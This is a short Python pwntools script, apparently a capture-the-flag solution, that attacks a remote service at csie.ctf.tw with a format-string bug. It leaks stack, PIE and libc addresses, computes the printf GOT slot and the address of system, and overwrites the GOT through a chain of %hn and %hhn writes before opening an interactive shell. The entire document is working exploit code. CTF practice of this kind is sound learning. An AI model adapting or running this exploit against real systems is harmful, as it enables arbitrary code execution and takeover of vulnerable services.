from pwn import *

r = remote('csie.ctf.tw', 10130)

def fmt(s):
    r.send(s)
    time.sleep(0.3)

def get(i, n):
    return (i >> 16 * (n-1)) & 0xffff

fmt('%6$p.%7$p.%11$p.')

r.recvuntil('0x')
stack = int(r.recvuntil('.')[:-1], 16)
b = stack + 0x10 & 0xff
print(stack)

r.recvuntil('0x')
pie = int(r.recvuntil('.')[:-1], 16) - 0x8ce
print(pie)

r.recvuntil('0x')
libc = int(r.recvuntil('.')[:-1], 16) - 0x21b94
print(libc)

printf_got = pie + 0x200da8
system = libc + 0x4f440

fmt('%{}c%8$hn'.format(get(printf_got, 1)))
fmt('%{}c%6$hhn'.format(b+2))
fmt('%{}c%8$hn'.format(get(printf_got, 2)))
fmt('%{}c%6$hhn'.format(b+4))
fmt('%{}c%8$hn'.format(get(printf_got, 3)))

fmt('%{}c%6$hhn'.format(b+8))
fmt('%{}c%8$hn'.format(get(printf_got+1, 1)))
fmt('%{}c%6$hhn'.format(b+8+2))
fmt('%{}c%8$hn'.format(get(printf_got+1, 2)))
fmt('%{}c%6$hhn'.format(b+8+4))
fmt('%{}c%8$hn'.format(get(printf_got+1, 3)))

fmt('%{}c%10$hhn%{}c%11$hn'.format(system & 0xff, (((system & 0xffff00) >> 8) - (system & 0xff))))

r.interactive()
